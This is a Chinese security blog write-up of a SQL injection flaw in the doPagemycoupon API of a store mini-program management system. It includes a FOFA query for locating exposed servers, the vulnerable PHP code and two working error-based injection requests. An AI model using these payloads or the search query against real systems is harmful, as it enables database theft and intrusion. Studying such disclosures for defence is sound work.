---
title: "万能门店小程序管理系统 /api/wxapps/doPagemycoupon SQL 注入漏洞"
source: https://mrxn.net/jswz/api-wxapps-doPagemycoupon-sqli.html
asset_dir: assets/万能门店小程序管理系统-apiwxappsdopagemycoupon-sql-注入漏洞
---

# 万能门店小程序管理系统 /api/wxapps/doPagemycoupon SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/17 18:32
* 540浏览
* [0评论](#comment)
* 24分钟阅读

深入探索

应用程序

application

应用程序接口


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。是一个集成了会员管理和会员营销两大核心功能的综合性平台。它支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。该系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统 /api/wxapps/doPagemycoupon 存在 [SQL 注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者可通过该漏洞获取数据库中的敏感信息，甚至可能进一步控制服务器。

音频与视频聊天

# 影响版本

万能门店小程序全开源独立版V5.2.0

# fofa语法

> `body="/new_plat/index.html#/login" || (body="/comhome/cases/index.html" && body="/Comhome/functionshow/index.html")`

# 漏洞分析

深入探索

小程序

SQL

api

application/api/controller/Wxapps.php

```
public function doPagemycoupon()
    {
        $uniacid = input('uniacid');
        $suid = input('suid');
        $flag = input('flag');
        $tiaojian = " and flag <> 2 and flag = 0";
        if ($flag == 0) {
            $tiaojian = " and flag <> 2 and flag = 0";
        }
        if ($flag == 1) {
            $tiaojian = " ";
        }

        //if ($suid) {
        //$user = Db::name('wd_xcx_user')->where("uniacid", $uniacid)->where("openid", $openid)->find();
        //}
        //$suid = $user['id'];
        $prefix = config('database.prefix');
        $yhqsold = Db::query("select * from {$prefix}wd_xcx_coupon_user where uniacid = " . $uniacid . " and suid = " . $suid . $tiaojian . " ORDER BY id desc");
        $time = time();
        $aa = [];
        foreach ($yhqsold as $key => &$resi) {
            if ($resi['etime'] != 0) {
                if ($time > $resi['etime'] && $resi['flag'] == 0) {
                    $kdata = array(
                        "flag" => 2
                    );
                    Db::name('wd_xcx_coupon_user')->where("id", $resi['id'])->update($kdata);
                }
            }
        }
        // 重新获取过滤后的我的优惠券
        $prefix = config('database.prefix');
        $yhqs = Db::query("select * from {$prefix}wd_xcx_coupon_user where uniacid = " . $uniacid . " and suid = " . $suid . $tiaojian . " ORDER BY flag asc, id desc");
        $type = input("type");

        foreach ($yhqs as $key => &$res) {
```

深入探索

sql

计算机安全

软件

两处 Db::query sql语句里的 `$uniacid` 和 `$suid` 均来自用户可控的参数，因此造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /api/wxapps/doPagemycoupon HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

uniacid=1+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)--&suid=1
```

[![万能门店小程序管理系统 /api/wxapps/doPagemycoupon SQL 注入漏洞](images/img-001-248682277542.webp)](https://image.mrxn.net/ac5f41d739f24c0eb63d4f50fd627a7a.webp)

```
POST /api/wxapps/doPagemycoupon HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

suid=1+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)+and+1=1&uniacid=1
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[万能门店小程序管理系统 /api/wxapps/doPagemycoupon SQL 注入漏洞](https://mrxn.net/jswz/api-wxapps-doPagemycoupon-sqli.html)  
文章链接：<https://mrxn.net/jswz/api-wxapps-doPagemycoupon-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-wxapps-doPagemycoupon-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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